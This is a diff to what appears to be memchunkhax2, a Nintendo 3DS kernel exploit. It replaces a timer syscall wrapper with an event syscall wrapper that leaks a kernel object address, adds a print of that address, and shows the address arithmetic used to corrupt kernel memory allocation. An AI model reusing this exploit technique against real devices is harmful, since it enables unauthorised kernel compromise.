@@ -52,12 +52,12 @@ static void allocate_thread(void* arg) {
     data->result = svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
 }
 
-// Creates a timer and outputs its kernel object address (at ref count, not vtable pointer) from r2.
-static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset_type, u32* kaddr) {
+// Creates an event and outputs its kernel object address (at ref count, not vtable pointer) from r2.
+static Result __attribute__((naked)) svcCreateEventKAddr(Handle* event, u8 reset_type, u32* kaddr) {
     asm volatile(
             "str r0, [sp, #-4]!\n"
             "str r2, [sp, #-4]!\n"
-            "svc 0x1A\n"
+            "svc 0x17\n"
             "ldr r3, [sp], #4\n"
             "str r2, [r3]\n"
             "ldr r3, [sp], #4\n"
@@ -137,10 +137,12 @@ void execute_memchunkhax2() {
     // If next is not 0, it will continue to whatever is pointed to by it.
     // Even if this eventually reaches an end, it will continue decrementing the remaining size value.
     // This will roll over, and panic when it thinks that there is more memory to allocate than was available.
-    if(R_FAILED(svcCreateTimerKAddr(&kObjHandle, 0, &kObjAddr))) {
+    if(R_FAILED(svcCreateEventKAddr(&kObjHandle, 0, &kObjAddr))) {
         printf("Failed to create KSynchronizationObject.\n");
         goto cleanup;
     }
+
+    printf("KObject address: %08X\n", (int) kObjAddr);
 
     // Convert the object address to a value that will properly convert to a physical address during mapping.
     kObjAddr = kObjAddr - SLAB_HEAP_VIRT + SLAB_HEAP_PHYS - KERNEL_VIRT_TO_PHYS;
